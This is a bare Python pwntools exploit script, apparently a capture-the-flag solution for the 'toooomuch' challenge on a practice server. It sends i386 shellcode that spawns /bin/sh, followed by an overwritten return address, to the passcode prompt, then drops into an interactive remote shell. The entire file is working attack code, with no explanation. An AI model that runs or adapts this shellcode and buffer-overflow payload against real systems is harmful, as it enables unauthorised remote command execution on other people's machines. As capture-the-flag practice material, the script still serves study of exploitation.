from pwn import * 
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') 

offset = 0x1c
#io = process("./toooomuch")
io = remote('hackme.inndy.tw', 7702) 

p=p32(0x90909090)
p+=p32(0x8950c031)
p+=p32(0x68e289e1)
p+=p32(0x68732f6e)
p+=p32(0x622f2f68)
p+=p32(0xb0e38969)
p+=p32(0x9080cd0b)


p+=p32(0x08049c60) 

#gdb.attach(io)

io.sendlineafter("Give me your passcode: ", p)
io.interactive() 
io.close()

